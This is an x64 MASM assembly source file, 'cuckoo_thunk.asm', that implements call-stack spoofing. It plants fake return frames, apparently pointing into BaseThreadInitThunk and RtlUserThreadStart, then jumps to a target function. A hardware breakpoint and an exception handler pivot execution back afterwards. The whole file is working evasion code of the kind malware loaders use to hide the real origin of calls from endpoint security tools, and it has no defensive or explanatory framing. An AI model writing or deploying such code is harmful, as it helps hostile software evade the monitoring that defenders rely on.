; cuckoo_thunk.asm (v3.2). Plants chain on cu_dispatch's local alloc, jmps
; target. Target's ret to BTITN+0x14 fires #DB, cu_veh pivots back.
;
; Mid-call chain: target -> BTITN+0x14 -> RtlUTS+0x21 -> 0.

OPTION DOTNAME

; CU_SPOOFER offsets -- must match cuckoo.h.
CU_SPOOF_FN          EQU 000h
CU_FAKE_L1           EQU 008h
CU_FAKE_L2           EQU 010h
CU_NARGS             EQU 018h
CU_ARG1              EQU 020h
CU_ARG2              EQU 028h
CU_ARG3              EQU 030h
CU_ARG4              EQU 038h
CU_ARG5              EQU 040h
CU_SLOT_A            EQU 048h
CU_SLOT_B            EQU 050h
CU_SLOT_C            EQU 058h
CU_SAVED_RSP         EQU 060h
CU_RETVAL            EQU 068h

EXTERN cu_arm_hwbp:PROC

.code

; cu_dispatch(rcx=&s). 8 nonvol push + 0x108 alloc -> body_rsp 0 mod 16.
; planted_top = body_rsp + slot_a (0x18) -> 8 mod 16 (Win64 ABI for jmp entry).
PUBLIC cu_dispatch
PUBLIC cu_dispatch_continuation
cu_dispatch PROC FRAME
    push    r15
    .pushreg r15
    push    r14
    .pushreg r14
    push    r13
    .pushreg r13
    push    r12
    .pushreg r12
    push    rdi
    .pushreg rdi
    push    rsi
    .pushreg rsi
    push    rbx
    .pushreg rbx
    push    rbp
    .pushreg rbp
    sub     rsp, 108h
    .allocstack 108h
    .endprolog

    mov     [rcx + CU_SAVED_RSP], rsp

    ; plant SlotA=L1(BTITN+0x14), SlotB=L2(RtlUTS+0x21), SlotC=0
    mov     rax, [rcx + CU_FAKE_L1]
    mov     rdx, [rcx + CU_SLOT_A]
    mov     [rsp + rdx], rax

    mov     rax, [rcx + CU_FAKE_L2]
    mov     rdx, [rcx + CU_SLOT_B]
    mov     [rsp + rdx], rax

    xor     rax, rax
    mov     rdx, [rcx + CU_SLOT_C]
    mov     [rsp + rdx], rax

    ; r12 carries &s across cu_arm_hwbp (already saved by our prolog).
    mov     r12, rcx
    sub     rsp, 20h
    call    cu_arm_hwbp
    add     rsp, 20h
    test    eax, eax
    jnz     cu_dispatch_fail
    mov     rcx, r12

    mov     r10, [rcx + CU_SLOT_A]
    add     r10, rsp                 ; r10 = planted_top

    mov     rax, [rcx + CU_ARG5]
    mov     [r10 + 28h], rax         ; arg5 stack slot

    ; rcx last (still holds &s).
    mov     r9,  [rcx + CU_ARG4]
    mov     r8,  [rcx + CU_ARG3]
    mov     rdx, [rcx + CU_ARG2]
    mov     rax, [rcx + CU_SPOOF_FN]
    mov     rcx, [rcx + CU_ARG1]

    mov     rsp, r10
    jmp     rax

    ; cu_arm_hwbp failed -- skip pivot, return 0.
cu_dispatch_fail:
    mov     rcx, r12
    xor     rax, rax
    mov     [rcx + CU_RETVAL], rax

cu_dispatch_continuation::
    ; rcx=&s, rsp=body_rsp on entry (set by cu_veh or cu_dispatch_fail).
    mov     rax, [rcx + CU_RETVAL]

    add     rsp, 108h
    pop     rbp
    pop     rbx
    pop     rsi
    pop     rdi
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    ret
cu_dispatch ENDP

END
